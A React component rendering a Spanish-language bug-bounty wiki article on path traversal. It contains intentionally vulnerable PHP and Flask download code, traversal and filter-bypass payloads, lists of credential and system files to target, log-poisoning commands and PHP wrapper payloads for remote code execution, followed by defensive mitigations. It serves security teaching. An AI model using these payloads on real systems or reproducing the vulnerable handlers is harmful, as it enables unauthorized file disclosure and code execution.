/**
 * PATH TRAVERSAL
 * Acceder a archivos fuera del directorio permitido
 */

import { ReactNode } from 'react';
import {
  Section,
  Subsection,
  Paragraph,
  Strong,
  InlineCode,
  AlertInfo,
  AlertWarning,
  AlertDanger,
  AlertTip,
  CodeBlock,
  TerminalOutput,
  HighlightBox,
  ListItem
} from '@/components/WikiArticleComponents';
import { FolderTree, Shield, File, AlertOctagon, ArrowRight } from 'lucide-react';
import Link from 'next/link';

interface ArticleContentProps {
  locale: string;
}

export default function PathTraversalContent({ locale }: ArticleContentProps): ReactNode {
  return (
    <>
      <Section id="introduccion" title="Path Traversal - Salir de la Cárcel de Directorios">
        <Paragraph>
          <Strong>Path Traversal (Directory Traversal)</Strong> permite acceder a archivos 
          fuera del directorio permitido usando secuencias como <InlineCode>../</InlineCode>. 
          Puede exponer código fuente, credentials, y archivos del sistema.
        </Paragraph>

        <AlertDanger title="Archivos Críticos Expuestos">
          <ul className="mt-2 space-y-1">
            <ListItem>🔐 /etc/passwd, /etc/shadow (Linux users)</ListItem>
            <ListItem>🔑 ~/.ssh/id_rsa (SSH private keys)</ListItem>
            <ListItem>📝 Código fuente (.env, config.php)</ListItem>
            <ListItem>🗝️ Application logs con tokens</ListItem>
            <ListItem>💾 Database backups (.sql files)</ListItem>
          </ul>
        </AlertDanger>
      </Section>

      <Section id="codigo-vulnerable" title="1. Código Vulnerable Típico">
        <CodeBlock
          language="php"
          title="❌ VULNERABLE - File download sin validación"
          code={`<?php
// Download de archivos públicos
$filename = $_GET['file'];

// ❌ VULNERABLE - Concatenación directa
$filepath = "/var/www/html/uploads/" . $filename;

if (file_exists($filepath)) {
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . $filename . '"');
    readfile($filepath);
} else {
    echo "File not found";
}
?>

<!-- URL normal:
/download.php?file=document.pdf

URL maliciosa:
/download.php?file=../../../etc/passwd
-->`}
        />

        <CodeBlock
          language="python"
          title="❌ VULNERABLE - Flask send_file"
          code={`from flask import Flask, request, send_file

app = Flask(__name__)

@app.route('/download')
def download():
    filename = request.args.get('file', 'default.txt')
    
    # ❌ VULNERABLE - No validar path
    filepath = f'/var/www/uploads/{filename}'
    
    return send_file(filepath)

# URL maliciosa:
# /download?file=../../../../etc/passwd`}
        />
      </Section>

      <Section id="payloads-basicos" title="2. Payloads Básicos">
        <CodeBlock
          language="text"
          title="Secuencias de traversal"
          code={`# Linux/Unix
../../../etc/passwd
../../../../etc/shadow
../../../../../../root/.ssh/id_rsa

# Windows
..\\..\\..\\windows\\system32\\drivers\\etc\\hosts
..\\..\\..\\..\\..\\boot.ini

# Mixed (funciona en algunos casos)
..\\../\\../etc/passwd
../\\../\\windows\\win.ini`}
        />

        <TerminalOutput title="Cómo funciona la navegación">
          {`# Directorio actual: /var/www/html/uploads/
# Request: ?file=../../../etc/passwd

Resolución:
/var/www/html/uploads/../../../etc/passwd
→ /var/www/html/../../../etc/passwd
→ /var/www/../../../etc/passwd
→ /var/../../../etc/passwd
→ /../../../etc/passwd
→ /etc/passwd ✓

# Resultado: Leer /etc/passwd`}
        </TerminalOutput>
      </Section>

      <Section id="bypass-filtros" title="3. Bypass de Filtros">
        <Subsection title="Técnica 1: URL Encoding">
          <CodeBlock
            language="text"
            title="Encoding simple y doble"
            code={`# URL encoding
../     → %2e%2e%2f
../../  → %2e%2e%2f%2e%2e%2f

# Double URL encoding
../     → %252e%252e%252f

# UTF-8 encoding
../     → ..%c0%af
../     → ..%c1%9c

# 16-bit Unicode
../     → %u002e%u002e%u002f`}
          />
        </Subsection>

        <Subsection title="Técnica 2: Bypass de strip()">
          <CodeBlock
            language="python"
            title="Si la app hace: path.replace('../', '')"
            code={`# Payload normal:
../../../etc/passwd

# Si se reemplaza ../ por vacío:
....//....//....//etc/passwd

# Después de replace:
../../../etc/passwd ✓

# Alternativa:
..././..././..././etc/passwd`}
          />
        </Subsection>

        <Subsection title="Técnica 3: Absolute Paths">
          <CodeBlock
            language="text"
            title="Si la app no valida paths absolutos"
            code={`# Linux
/etc/passwd
/root/.ssh/id_rsa
/var/log/apache2/access.log

# Windows
C:\\Windows\\System32\\drivers\\etc\\hosts
C:\\inetpub\\wwwroot\\web.config`}
          />
        </Subsection>

        <Subsection title="Técnica 4: Null Byte Injection">
          <CodeBlock
            language="text"
            title="Bypass de extensión forzada (PHP < 5.3)"
            code={`# Si la app agrega .txt automáticamente:
# $filepath = $base_dir . $filename . '.txt';

# Payload con null byte (%00):
../../../../etc/passwd%00

# Interpretación:
# /var/www/uploads/../../../../etc/passwd\x00.txt
# → Leer /etc/passwd (null byte trunca la extensión)

# Nota: No funciona en PHP >= 5.3`}
          />
        </Subsection>

        <Subsection title="Técnica 5: Dot Segments Variations">
          <CodeBlock
            language="text"
            title="Diferentes representaciones de .."
            code={`# Puntos extra
...//
....//

# Mixed slashes
..\\
..\\/
../\\

# UNC paths (Windows)
\\\\host\\share\\..\\..\\windows\\system32\\config\\sam`}
          />
        </Subsection>
      </Section>

      <Section id="archivos-windows" title="4. Archivos Sensibles en Windows">
        <CodeBlock
          language="text"
          title="Targets comunes Windows"
          code={`# System files
C:\\Windows\\System32\\drivers\\etc\\hosts
C:\\Windows\\win.ini
C:\\Windows\\System32\\config\\SAM        (hashes de passwords)
C:\\Windows\\System32\\config\\SYSTEM

# IIS
C:\\inetpub\\wwwroot\\web.config          (connection strings)
C:\\inetpub\\logs\\LogFiles\\W3SVC1\\     (access logs)

# Application files
C:\\xampp\\htdocs\\config.php
C:\\wamp\\www\\wp-config.php
C:\\Program Files\\MyApp\\secrets.json`}
        />
      </Section>

      <Section id="archivos-linux" title="5. Archivos Sensibles en Linux">
        <CodeBlock
          language="text"
          title="Targets comunes Linux"
          code={`# Sistema
/etc/passwd                    (users list)
/etc/shadow                    (password hashes) - Requiere root
/etc/hosts
/etc/hostname
/proc/self/environ             (environment variables)
/proc/self/cmdline             (comando de inicio)

# SSH
/root/.ssh/id_rsa
/root/.ssh/authorized_keys
/home/username/.ssh/id_rsa

# Web server
/var/www/html/.env
/var/www/html/config.php
/var/log/apache2/access.log
/var/log/nginx/error.log

# Application
/opt/app/secrets.yaml
/home/appuser/.bash_history    (comandos ejecutados)
/tmp/debug.log`}
        />
      </Section>

      <Section id="log-poisoning" title="6. Log Poisoning - De LFI a RCE">
        <Paragraph>
          Si puedes leer logs Y controlar su contenido, puedes lograr <Strong>RCE</Strong>.
        </Paragraph>

        <CodeBlock
          language="bash"
          title="Técnica: Envenenar User-Agent en access log"
          code={`# 1. Inyectar código PHP en User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://victim.com/

# 2. Leer log con path traversal
http://victim.com/download?file=../../../../var/log/apache2/access.log&cmd=id

# Log contiene:
# 192.168.1.100 - - [05/Jan/2026:12:00:00] "GET / HTTP/1.1" 200 
# User-Agent: <?php system(\$_GET['cmd']); ?>

# PHP ejecuta el código en el log → RCE ✓`}
        />

        <CodeBlock
          language="text"
          title="Otros vectores de log poisoning"
          code={`# SSH log (/var/log/auth.log)
ssh '<?php system($_GET["cmd"]); ?>'@victim.com

# Mail log (/var/mail/www-data)
telnet victim.com 25
MAIL FROM:<?php system($_GET['cmd']); ?>

# FTP log (/var/log/vsftpd.log)
ftp victim.com
USER <?php system($_GET['cmd']); ?>`}
        />
      </Section>

      <Section id="php-wrappers" title="7. PHP Wrappers - Técnicas Avanzadas">
        <Subsection title="php://filter - Base64 Encode">
          <CodeBlock
            language="text"
            title="Leer código fuente sin ejecutarlo"
            code={`# Problema: Si intentas leer index.php, PHP lo ejecuta
/download?file=index.php  → Output: HTML renderizado

# Solución: Usar php://filter para base64 encode
/download?file=php://filter/convert.base64-encode/resource=index.php

# Output: PD9waHAKZWNobyAiSGVsbG8iOwo/Pg==
# Decode: <?php echo "Hello"; ?>

# Leer archivos sensibles:
/download?file=php://filter/convert.base64-encode/resource=../config.php
/download?file=php://filter/convert.base64-encode/resource=../../../../etc/passwd`}
          />
        </Subsection>

        <Subsection title="php://input - RCE">
          <CodeBlock
            language="bash"
            title="Ejecutar código via POST body"
            code={`# Si include() acepta php://input
curl -X POST --data "<?php system('id'); ?>" \\
  "http://victim.com/index.php?page=php://input"

# PHP lee POST body como archivo y lo ejecuta → RCE`}
          />
        </Subsection>

        <Subsection title="data:// - Inline Code">
          <CodeBlock
            language="text"
            title="Ejecutar código inline"
            code={`# PHP >= 5.2.0
/index.php?page=data://text/plain,<?php system('id'); ?>

# Base64 encoded
/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==

# Decode: <?php system('id'); ?>`}
          />
        </Subsection>

        <Subsection title="expect:// - Command Execution">
          <CodeBlock
            language="text"
            title="RCE directo (requiere extensión expect)"
            code={`# Si expect:// está habilitado
/download?file=expect://id
/download?file=expect://ls -la

# Output: Resultado del comando directamente`}
          />
        </Subsection>
      </Section>

      <Section id="mitigacion" title="Mitigación Completa">
        <AlertDanger title="✅ Prevenir Path Traversal">
          Validar y sanitizar TODOS los paths de archivos.
        </AlertDanger>

        <Subsection title="1. Whitelist de Archivos Permitidos">
          <CodeBlock
            language="python"
            title="✅ SEGURO - Mapeo de IDs a archivos"
            code={`# ✅ MEJOR PRÁCTICA: No aceptar filenames directamente
ALLOWED_FILES = {
    'doc1': '/var/www/uploads/document1.pdf',
    'doc2': '/var/www/uploads/document2.pdf',
    'img1': '/var/www/uploads/image.png'
}

@app.route('/download')
def download():
    file_id = request.args.get('id')
    
    # ✅ Validar contra whitelist
    if file_id not in ALLOWED_FILES:
        abort(404)
    
    filepath = ALLOWED_FILES[file_id]
    
    return send_file(filepath)

# URL: /download?id=doc1
# Payload inyectado: /download?id=../../../etc/passwd
# Resultado: 404 (no está en whitelist) ✓`}
          />
        </Subsection>

        <Subsection title="2. Path Canonicalization">
          <CodeBlock
            language="python"
            title="✅ SEGURO - Resolver path real y validar"
            code={`import os
from pathlib import Path

BASE_DIR = '/var/www/uploads'

@app.route('/download')
def download():
    filename = request.args.get('file')
    
    # ✅ Construir path completo
    requested_path = os.path.join(BASE_DIR, filename)
    
    # ✅ Resolver path real (canonicalización)
    real_path = os.path.realpath(requested_path)
    
    # ✅ Verificar que está dentro de BASE_DIR
    if not real_path.startswith(os.path.realpath(BASE_DIR)):
        abort(403, "Access denied")
    
    # ✅ Verificar que existe
    if not os.path.isfile(real_path):
        abort(404)
    
    return send_file(real_path)

# Ejemplo:
# BASE_DIR: /var/www/uploads
# filename: ../../../etc/passwd
# requested_path: /var/www/uploads/../../../etc/passwd
# real_path: /etc/passwd
# real_path.startswith('/var/www/uploads'): False → 403 ✓`}
          />
        </Subsection>

        <Subsection title="3. Sanitización de Input">
          <CodeBlock
            language="php"
            title="✅ SEGURO - Remover secuencias peligrosas"
            code={`<?php
function sanitize_filename($filename) {
    // ✅ Remover path separators
    $filename = basename($filename);
    
    // ✅ Remover null bytes
    $filename = str_replace("\x00", '', $filename);
    
    // ✅ Whitelist de caracteres permitidos
    if (!preg_match('/^[a-zA-Z0-9._-]+$/', $filename)) {
        throw new Exception('Invalid filename');
    }
    
    // ✅ Validar extensión permitida
    $allowed_extensions = ['pdf', 'png', 'jpg', 'txt'];
    $ext = pathinfo($filename, PATHINFO_EXTENSION);
    
    if (!in_array(strtolower($ext), $allowed_extensions)) {
        throw new Exception('Invalid file extension');
    }
    
    return $filename;
}

$filename = sanitize_filename($_GET['file']);
$filepath = '/var/www/uploads/' . $filename;

// Payload: ../../../etc/passwd
// basename(): passwd (remueve ../)
// Validación: passwd no tiene extensión permitida → Exception ✓
?>`}
          />
        </Subsection>

        <Subsection title="4. Node.js - path.normalize()">
          <CodeBlock
            language="javascript"
            title="✅ SEGURO - Validar con path module"
            code={`const path = require('path');
const fs = require('fs');

const BASE_DIR = '/var/www/uploads';

app.get('/download', (req, res) => {
  const filename = req.query.file;
  
  // ✅ Normalizar path
  const safePath = path.normalize(path.join(BASE_DIR, filename));
  
  // ✅ Verificar que está dentro de BASE_DIR
  if (!safePath.startsWith(BASE_DIR)) {
    return res.status(403).send('Access denied');
  }
  
  // ✅ Verificar que existe
  if (!fs.existsSync(safePath)) {
    return res.status(404).send('File not found');
  }
  
  res.sendFile(safePath);
});`}
          />
        </Subsection>

        <Subsection title="5. Deshabilitar PHP Wrappers">
          <CodeBlock
            language="ini"
            title="✅ php.ini - Deshabilitar wrappers peligrosos"
            code={`; ✅ Deshabilitar allow_url_include
allow_url_include = Off

; ✅ Deshabilitar allow_url_fopen (si no es necesario)
allow_url_fopen = Off

; ✅ Configurar open_basedir
open_basedir = /var/www/uploads:/tmp

; Ahora PHP solo puede acceder a estos directorios
; /etc/passwd → Bloqueado ✓`}
          />
        </Subsection>
      </Section>

      <div className="mt-12 pt-8 border-t border-slate-200 dark:border-slate-800">
        <h3 className="text-2xl font-bold text-slate-900 dark:text-white mb-4">Siguiente: File Upload Vulnerabilities</h3>
        <Link
          href={`/${locale}/wiki/bug-bounty/file-upload`}
          className="group inline-flex items-center gap-3 px-6 py-4 bg-gradient-to-r from-orange-600 to-red-600 text-white rounded-xl font-semibold hover:shadow-xl hover:shadow-orange-500/50 transition-all"
        >
          <span>Subir archivos maliciosos para RCE</span>
          <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
        </Link>
      </div>
    </>
  );
}
